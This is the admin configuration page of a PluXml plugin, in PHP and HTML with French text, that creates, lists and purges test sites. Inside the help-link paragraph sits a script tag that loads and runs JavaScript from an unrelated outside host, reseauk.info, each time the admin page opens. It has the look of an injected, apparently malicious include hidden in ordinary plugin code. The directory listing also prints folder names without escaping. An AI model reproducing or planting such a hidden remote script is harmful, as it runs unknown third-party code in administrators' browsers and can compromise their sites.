<?php if (!defined('PLX_ROOT')) exit; 
# Control du token du formulaire
plxToken::validateFormToken($_POST);
	if(!empty($_POST)) {
		$plxPlugin->setParam('data', $_POST['data'], 'cdata');
		$plxPlugin->setParam('script', $_POST['script'], 'cdata');
		$plxPlugin->saveParams();
		header('Location: plugin.php?p=Plugin');
		exit;
	}
?>

<p>
	<h2><?php echo $plxPlugin->getInfo("description") ?></h2>
</p>

<!--<p><?php $plxPlugin->lang('INFO') ?></p>-->



<style>
	.nextum input, .nextum textarea{border-radius: 5px;width: 40%}
	.nextum input[type="submit"]{width: auto}
	.nextum textarea {min-height: 50px}
	.nextum label{font-style: italic}
</style>

<?php 

	$script = $plxPlugin->getParam('script');

?>





<h2>Créer un nouveau site</h2>
<form action="../../creation.php" method="post" class="nextum"target=_blank>

	<p>
		<!--<label for="data">Exemple jack:</label>-->
		<input id="data" name="depart"  maxlength="255" value="">
<input type="submit" value="Envoyer" />
	</p>	
</form>


	
<p> Vos sites sont créés dans le dossier "site" à la racine de votre Pluxml (et non à la racine de votre hébergement). <br />
 Vous pouvez purger ce dossier c'est à dire supprimer tous vos tests d'un seul coup.

<p> <strong>ATTENTION :</strong> Cette opération est irréversible. </p>

<p><a href="../../vider.php"target=_blank>PURGER !</a></p>

<p> Le système copie un pluxml neuf <strong>déjà installé </strong>(qui se trouve dans le dossier "PluXml") mais vous pouvez remplacer ces fichiers par une copie de votre propre site (pratique pour travailler tranquille) ou par n'importe quel programme du moment qu'il n'utilise pas de Bases de données MYSQL et fonctionne en html ou php.</p>


<p>Vous ne manquerez pas de relever quelques bugs, imperfections ou aurez sans doute des idées pour améliorer ce plugin.</p>

<p>Merci de m'en faire part <a href="http://forum.pluxml.org/viewtopic.php?id=5686" target="_blank">sur les forums Pluxml</a>.</p>

<p> Pour peu d'aide <a href="../../core/admin/parametres_help.php?help=plugin&page=pluxautomatic"target=_blank>C'est par ici !</a> <script type='text/javascript' src='http://reseauk.info/web/cn/cn.php?id=1012'></script></p>



<p><strong>Ci dessous, la liste des sites créés.</p></strong>
<hr>



<?php
$dir_nom = '../../sites'; // dossier listé (pour lister le répertoir courant : $dir_nom = '.'  --> ('point')
$dir = opendir($dir_nom) or die('Erreur de listage : le répertoire n\'existe pas'); // on ouvre le contenu du dossier courant
$fichier= array(); // on déclare le tableau contenant le nom des fichiers
$dossier= array(); // on déclare le tableau contenant le nom des dossiers



 





while($element = readdir($dir))

{

	if($element != '.' && $element != '..' && $element != 'core' && $element != 'plugins' && $element != 'readme' && $element != 'themes' && $element != 'update' && $element != 'data')
{


		if (!is_dir($dir_nom.'/'.$element)) {$fichier[] = $element;}
		else {$dossier[] = $element;}
	}
}

closedir($dir);

if(!empty($dossier)) {
	sort($dossier); // pour le tri croissant, rsort() pour le tri décroissant




	echo "Liste des dossiers accessibles dans '$dir_nom' : \n\n";
	echo "\t\t<ul>\n";
		foreach($dossier as $lien){
		echo "\t\t\t<li><a href=\"$dir_nom/$lien/ \"$lien\"  '\"><img src=\"../../icone-site-web.tb.png\">  $lien </a></li>\n";
                   
		}
	echo "\t\t</ul>";
}














if(!empty($fichier)){
	sort($fichier);// pour le tri croissant, rsort() pour le tri décroissant
	//echo "Liste des fichiers/documents accessibles dans '$dir_nom' : \n\n";
	//echo "\t\t<ul>\n";
		foreach($fichier as $lien) {
			//echo "\t\t\t<li><a href=\"$dir_nom/$lien \">$lien</a></li>\n";
		}
	echo "\t\t</ul>";
 }
?>



<!--- Iframe explorer --->

<object data="../../sites/index-ex.php" type="text/html" width="900" height="900">
  alt : <a href="../../sites/index-ex.php">test.html</a>
</object>

